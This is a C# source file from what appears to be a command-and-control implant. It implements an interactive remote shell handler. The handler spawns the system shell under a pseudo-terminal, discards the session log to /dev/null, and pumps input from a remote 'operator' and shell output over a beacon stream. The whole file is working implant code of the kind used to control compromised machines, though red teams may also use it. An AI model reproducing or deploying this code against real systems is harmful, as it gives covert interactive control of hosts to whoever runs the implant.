using System.Diagnostics;
using Rod.V1;

namespace Rod.Implant.Internal;

// The streaming task shape's implant half (architecture.md Sec 10.3): the
// shell.interact handler. Where shell.exec runs one command and reports it
// whole, shell.interact holds the platform shell open on a live channel --
// operator input flows in as ChannelInput frames and the shell's output
// streams back as ChannelOutput chunks on the same beacon stream, until the
// operator closes stdin or the shell exits and the task completes through an
// ordinary TaskResult.
//
// The channel is byte-transparent and the handler is transport-blind: it
// pumps bytes through an IChannelStream (the registry's channel contract,
// Capabilities.cs) and never touches gRPC, so the wire contract places no
// interpretation on the traffic. On Unix the shell runs under `script`,
// which allocates a pseudo-terminal for it -- the channel then behaves like
// a real terminal: the shell prints its prompt, line editing works, and the
// interrupt byte (0x03, the operator pane's ^C) becomes SIGINT for the
// foreground program, so Ctrl+C kills the running command rather than the
// shell. Where `script` is missing, or on platforms without an equivalent
// (Windows would want ConPTY), the handler falls back to the plain pipes
// shape: byte-transparent but with no terminal semantics -- no prompt, no
// echo, no signal byte.

/// <summary>
/// The interactive shell handler: spawns the platform shell (under a
/// pseudo-terminal on Unix) and pumps the pipes until the channel ends --
/// output upstream as chunks, operator input downstream into the shell. The
/// optional arguments string is an initial command, shell.exec's grammar
/// carried over, run once before the channel holds the session open.
/// </summary>
internal static class InteractiveShell
{
    // The output pump's read buffer: one read is one output chunk, so this is
    // the largest ChannelOutput frame the channel emits -- well inside the
    // frame-layer sizing budget with protobuf overhead to spare.
    private const int OutputChunkBytes = 16 * 1024;

    /// <summary>
    /// Runs the interactive shell on <paramref name="stream"/> until the shell
    /// exits, the operator closes stdin, or <paramref name="cancellationToken"/>
    /// fires (the beacon stream ended; the shell is killed with the channel).
    /// </summary>
    public static async Task<(TaskOutcome Outcome, string Output)> RunAsync(
        string arguments,
        IChannelStream stream,
        CancellationToken cancellationToken)
    {
        var (shell, _) = Core.PlatformShell();
        var psi = new ProcessStartInfo
        {
            FileName = shell,
            UseShellExecute = false,
            RedirectStandardInput = true,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };

        // The pseudo-terminal wrapper. util-linux script takes the command
        // as one -c string and -e propagates the child's exit code; BSD
        // script (macOS) takes it as trailing arguments. Both quiet their own
        // chatter with -q and log nothing with /dev/null as the typescript
        // file.
        if (OperatingSystem.IsLinux())
        {
            psi.FileName = "script";
            psi.ArgumentList.Add("-qec");
            psi.ArgumentList.Add(shell);
            psi.ArgumentList.Add("/dev/null");
        }
        else if (OperatingSystem.IsMacOS())
        {
            psi.FileName = "script";
            psi.ArgumentList.Add("-q");
            psi.ArgumentList.Add("/dev/null");
            psi.ArgumentList.Add(shell);
        }

        try
        {
            Process? started;
            try
            {
                started = Process.Start(psi);
            }
            catch (System.ComponentModel.Win32Exception) when (psi.FileName == "script")
            {
                // No `script` on this box (a stripped container, say): the
                // plain pipes shape still talks to the shell, just without
                // terminal semantics.
                psi.FileName = shell;
                psi.ArgumentList.Clear();
                started = Process.Start(psi);
            }
            using var process = started;
            if (process is null)
                return (TaskOutcome.Failed, "failed to start shell");

            // The channel is session-scoped: the beacon stream's end cancels
            // this token, and the shell dies with the channel rather than
            // outliving it as an orphan.
            cancellationToken.Register(static state =>
            {
                try { ((Process)state!).Kill(entireProcessTree: true); }
                catch { /* already gone */ }
            }, process);

            // Everything rides the raw stdin stream -- mixing the text writer's
            // buffering with raw byte writes would reorder the input.
            var stdin = process.StandardInput.BaseStream;

            if (!string.IsNullOrWhiteSpace(arguments))
            {
                var encoded = System.Text.Encoding.UTF8.GetBytes(arguments + "\n");
                await stdin.WriteAsync(encoded, cancellationToken);
                await stdin.FlushAsync(cancellationToken);
            }

            // The input pump parks on operator input that may never come, so
            // it runs on its own token: when the shell exits (below) the pump
            // is released rather than parked forever on a dead channel.
            using var shellGone = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
            var pumps = new Task[]
            {
                PumpOutputAsync(process.StandardOutput.BaseStream, stream, cancellationToken),
                PumpOutputAsync(process.StandardError.BaseStream, stream, cancellationToken),
                PumpInputAsync(stdin, stream, shellGone.Token),
            };

            try
            {
                await process.WaitForExitAsync(cancellationToken);
            }
            finally
            {
                // Release the input pump and drain the output pumps (they end
                // at pipe EOF, which follows process exit).
                shellGone.Cancel();
                try { await Task.WhenAll(pumps); }
                catch (OperationCanceledException) { }
                catch (IOException) { }
                try { stdin.Close(); } catch { /* already closed */ }
            }

            return process.ExitCode == 0
                ? (TaskOutcome.Succeeded, "shell exited")
                : (TaskOutcome.Failed, $"shell exited with code {process.ExitCode}");
        }
        catch (OperationCanceledException)
        {
            return (TaskOutcome.Failed, "channel closed: the beacon stream ended");
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }

    // One output pipe: reads until EOF, streaming each read as one chunk. The
    // await on WriteOutputAsync is the backpressure -- a slow stream slows the
    // pump, so the pipe's own buffer is the only buffering.
    private static async Task PumpOutputAsync(
        Stream source,
        IChannelStream stream,
        CancellationToken cancellationToken)
    {
        var buffer = new byte[OutputChunkBytes];
        while (true)
        {
            var read = await source.ReadAsync(buffer, cancellationToken);
            if (read <= 0)
                return; // Pipe EOF: the shell exited.
            await stream.WriteOutputAsync(buffer.AsMemory(0, read), cancellationToken);
        }
    }

    // The input pipe: operator input into the shell's stdin. Eof closes stdin
    // -- the shell reads its own EOF and exits, ending the channel naturally.
    private static async Task PumpInputAsync(
        Stream stdin,
        IChannelStream stream,
        CancellationToken cancellationToken)
    {
        while (true)
        {
            byte[]? data;
            bool eof;
            try
            {
                (data, eof) = await stream.ReadInputAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return; // The shell is gone; nobody reads what we would forward.
            }
            catch (System.Threading.Channels.ChannelClosedException)
            {
                return; // The channel host completed the input; nothing more comes.
            }

            if (data is { Length: > 0 })
            {
                try
                {
                    await stdin.WriteAsync(data, CancellationToken.None);
                    await stdin.FlushAsync(CancellationToken.None);
                }
                catch (IOException)
                {
                    return; // The shell exited under us; stdin is gone.
                }
                catch (ObjectDisposedException)
                {
                    return;
                }
            }

            if (eof)
            {
                try { stdin.Close(); } catch { /* already closed */ }
                return;
            }
        }
    }
}
